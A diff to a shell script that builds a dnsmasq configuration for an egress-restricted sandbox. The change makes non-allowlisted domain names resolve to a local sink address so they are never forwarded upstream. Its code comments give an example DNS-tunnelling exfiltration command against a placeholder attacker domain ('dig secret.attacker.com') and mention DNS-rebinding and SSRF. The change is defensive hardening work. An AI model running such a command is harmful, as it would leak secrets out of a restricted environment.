@@ -75,15 +75,19 @@ printf '%s\n' $dns_up > /run/sluice-dns-upstream   # init-firewall allows these 
   echo "cache-size=2000"
   echo "min-cache-ttl=3600"        # pin pool IPs long enough that client + squid agree
   # Resolution is scoped to the egress allowlist: dnsmasq forwards only allowlisted names (per-domain
-  # server= lines in the servers-file, re-read on SIGHUP for `learn`), so an app can't tunnel exfil as
-  # DNS labels to an off-allowlist nameserver (dig secret.attacker.com -> no upstream -> REFUSED).
-  # stop-dns-rebind drops RFC1918 answers (DNS-rebinding/SSRF into your network). learn --audit and
-  # SLUICE_DNS_OPEN=1 keep the old forward-all behaviour (reach hosts off the allowlist).
+  # server= lines in the servers-file, re-read on SIGHUP for `learn`). A non-allowlisted name resolves
+  # to a dead SINK, answered LOCALLY and never forwarded upstream - so an agent can't tunnel exfil as
+  # DNS labels (dig secret.attacker.com never reaches an off-allowlist nameserver). The sink connection
+  # still hits squid via the 80/443 REDIRECT, which logs it as blocked, so `sluice learn`/`doctor`/the
+  # receipt can still discover the host. A more specific server=/host/up overrides the sink (`#`) for
+  # allowlisted names. stop-dns-rebind drops RFC1918 upstream answers (DNS-rebinding/SSRF into your
+  # network). learn --audit and SLUICE_DNS_OPEN=1 keep the old forward-all behaviour.
   if [ "${SLUICE_DNS_OPEN:-}" = 1 ] || [ "${SLUICE_AUDIT:-}" = 1 ]; then
     for u in $dns_up; do echo "server=$u"; done
   else
     echo "stop-dns-rebind"
     echo "rebind-localhost-ok"
+    echo "address=/#/192.0.2.1"     # sink for non-allowlisted names (TEST-NET-1, never routed)
     echo "servers-file=/run/dnsmasq-servers.conf"
   fi
 } > /run/dnsmasq-sluice.conf       # /run (not /etc) so it works under a read-only rootfs
